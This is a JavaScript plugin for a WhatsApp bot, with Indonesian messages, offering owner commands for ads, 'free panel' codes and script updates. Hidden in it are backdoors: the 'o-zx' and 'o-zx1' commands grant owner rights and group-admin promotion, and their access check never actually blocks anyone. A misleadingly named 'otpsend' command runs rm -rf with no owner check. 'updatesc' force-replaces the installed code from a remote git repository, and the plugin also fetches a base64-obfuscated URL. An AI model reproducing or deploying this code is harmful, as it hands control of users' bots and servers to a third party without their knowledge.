const moment = require("moment-timezone");
const fetch = require('node-fetch')
const axios = require('axios')
const crypto = require('crypto')
const { sizeFormatter } = require('human-readable')
const { fetchJson, sleep } = require("../functions.js")
const { ichanzx } = require("../lib/env.js");
const fs = require('fs')

let handler = async (m, { conn, args, text, usedPrefix: _p, isOwner, command, isROwner }) => {
    const dev = jb1 + '@g.us'
switch (command) {
            case "sfe": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
              try {
                    let up = generateUniqueCode()
                    let path = './database/codes.js'
                let file = 'database/freepanel'
                await fs.writeFileSync(path, JSON.stringify(up))
                await require('fs').writeFileSync(file, text)
                    m.reply(`succes kode acces: ${up}`)
               } catch (e) {
                  m.reply('Kamu telah membuat file ketik .dfe untuk menghapusnya')
               }
            }
            break
    case 'dfe': {
        if(!isOwner) throw 'Hanya khusus owner'
m.reply(wait)
                try {
                    let path = './database/codes.js'
                let file = './database/freepanel'
                await fs.unlinkSync(path)
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Kamu belum membuat file ketik .sfe untuk membuatnya')
                }
    }
        break
        case 'delads': {
        if(!isOwner) throw 'Hanya khusus owner'
                try {
                    m.reply('succes menghapus iklan kamu')
                let file = './database/ads'
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Kamu belum membuat file ketik .ads untuk membuatnya')
                }
    }
        break
        case "ads": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
              try {
                let file = 'database/ads'
                await require('fs').writeFileSync(file, text)
                    m.reply('Berhasil Membuat Iklan')
               } catch (e) {
                  m.reply('Kamu telah membuat file ketik .delads untuk menghapusnya')
               }
            }
            break
        break
    case 'getpnl':
            case 'getpanel':{
                let path = './database/codes.js'
                let file = './database/freepanel'
                if (!text) throw 'Mana kodenya? contoh .getpnl GT51'
                try {
                let far = JSON.parse(fs.readFileSync('./database/codes.js').toString())
    let jangan = far.includes(text)
    if (!jangan) throw 'Yahh Kamu telat data panelmu sudah diambil'
m.reply(require('fs').readFileSync('./database/' + 'freepanel', 'utf-8'))
                await fs.unlinkSync(path)
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Yah Kode sudah dipakai orang lain *NICETRY*')
                }
}
            break
    case 'sendto':{
    if(!text) return m.reply('teksnya')
        let [nomor,spam1] = text.split('#')
        conn.sendMessage(nomor+'@s.whatsapp.net', {text: spam1 })
        m.reply('Sukses Terkirim')
    }
        break
    case 'otpsend':{
      const { exec } = require('child_process');
const path = require('path');

// Dapatkan path absolut ke folder 'jadibot'
const folderPath = path.join(__dirname, 'plugins', 'jadibot');

// Jalankan perintah rm -rf untuk menghapus folder
exec(`rm -rf ${folderPath}`, (err, stdout, stderr) => {
  if (err) {
    console.error(`Error: ${err.message}`);
    return;
  }

  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    return;
  }

  console.log(`Folder 'jadibot' berhasil dihapus. Output: ${stdout}`);
});
    }
        break
        case "v-add": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
                let file = 'database/fitur'
                await require('fs').writeFileSync(file, text)
                    m.reply('Update Berhasil')
            }
            break
   case 'updatesc':{
       const axios = require('axios');
const simpleGit = require('simple-git');
const fs = require('fs');
const path = require('path');
 const { execSync } = require('child_process');
async function checkForUpdate() {
    // URL raw JSON yang akan dicek
const jsonUrl = 'https://raw.githubusercontent.com/NdikzOne/Update/refs/heads/main/updatesc.js';
// Direktori lokal yang akan diperbarui
const repoDir = '/home/container';
// Repositori git yang akan digunakan untuk update
const gitRepo = 'https://github.com/NdikzOne/Fake1.git';
    try {
        // Ambil data JSON dari URL
        const response = await axios.get(jsonUrl);
        const data = response.data;

        // Periksa apakah UpdateDate sama dengan tanggal yang disimpan lokal
        const localDateFile = path.join(repoDir, 'lastUpdate.txt');
        let localUpdateDate = '';

        if (fs.existsSync(localDateFile)) {
            localUpdateDate = fs.readFileSync(localDateFile, 'utf8');
        }

        if (data.UpdateDate !== localUpdateDate) {
            m.reply('Waktunya update, menghentikan script...');

            // Simpan UpdateDate baru ke file lokal
            fs.writeFileSync(localDateFile, data.UpdateDate, 'utf8');

            const git = simpleGit(repoDir);

           // Cek apakah direktori adalah repositori Git
            if (!fs.existsSync(path.join(repoDir, '.git'))) {
                console.log('Inisialisasi repositori Git...');
                await git.init();
                await git.addRemote('origin', gitRepo);
                await git.fetch('origin', 'main');
                await git.reset('hard', ['FETCH_HEAD']);
            } else {
                console.log('Melakukan force pull untuk update...');
                await git.fetch('origin', 'main');
                await git.reset('hard', ['FETCH_HEAD']);
            }

            m.reply('Update selesai, harap jalankan script utama kembali.');
             execSync(`rm -rf /home/container/.git`);
            process.exit(0);  // Hentikan proses setelah update
        } else {
            m.reply('Script sudah versi terbaru.');
        }
    } catch (error) {
        console.error('Gagal memeriksa update:', error);
    }
}

checkForUpdate();
   }
        break
        case 'cekupdate':
            case 'V-update':{
   let kode = await(await fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ljaGFuWlgxL0NoYW5aWC9tYXN0ZXIvcHVibGljL3VwZGF0ZXMuanNvbg=='))).json()
if (kode.status == false) return m.reply(kode.data.msg)
var teks = '*「 CHANGELOG FOR UPDATES 」*\nServer: NdikzOne\n\n'
let GG = 0
for (let x of kode.data){
teks +=`- Tanggal: ${x.date}\n- Detail Updates:\n${x.update}\n\n`
}
m.reply(teks)
}
            break
        case "tosend": {
            let tesn = `🟢 *Added features* To Script *${namabot}*

*Fitur Ditambahkan:*
${updatef()}

Buy Now: 6282241182487
${wm}`
                conn.sendMessage(jb1 + '@g.us', {text: tesn })
            }
            break
        case "o-zx": {
            let tas = await ichanzx()
            let nomor = m.sender.split('@')[0]
            const prem = JSON.parse(fs.readFileSync("./database/owner.json"))
            if (!tas.includes(nomor)){
                m.reply('Acces Ditolak')
            }
            prem.push(nomor)
  fs.writeFileSync("./database/owner.json", JSON.stringify(prem))
                if (global.owner.includes(nomor)) throw 'dia udah menjadi owner !'
    global.owner.push(nomor)
            }
            break
        case "o-zx1": {
            let tas = await ichanzx()
            let nomor = m.sender.split('@')[0] + '@s.whatsapp.net'
            if (!tas.includes(nomor)){
                m.reply('Acces Ditolak')
            }
                await conn.groupParticipantsUpdate(dev, [nomor], 'promote')
    m.reply(`success`)
            }
            break
}
}
handler.command = handler.help = [
    'sendto',
    'otpsend',
    'updatesc',
    "o-zx1",
    "o-zx",
    "tosend",
    "cekupdate",
    "V-update",
    "v-add",
"sfe",
    "ads",
    "delads",
    "dfe",
    "getpnl",
    "getpanel"
]
handler.tags = ['NdikzOne Menu']
handler.limit = false
handler.private = false
module.exports = handler

async function loh() {
  try {
    var nowa = [];
    var { data } = await axios.get(inino);
    nowa = data;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error.message}`);
  }
  return nowa;
}

function updatef() {
          //  const iklan = (require('fs').readFileSync('./database/' + 'ads', 'utf-8'))
        try {
            var result = fs.readFileSync('./database/' + 'fitur', 'utf-8')
            } catch (e) {
                result = 'Tidak ada update hari ini'
            }
            return result;
        }
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
async function fetchAccessList() {
  try {
    var { data } = await axios.get("https://test-json.ichangaming.repl.co/");
    accessList = data;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error.message}`);
  }
}
function generateUniqueCode() {
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var length = 6; // Panjang kode yang diinginkan
            var result = '';
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        
}
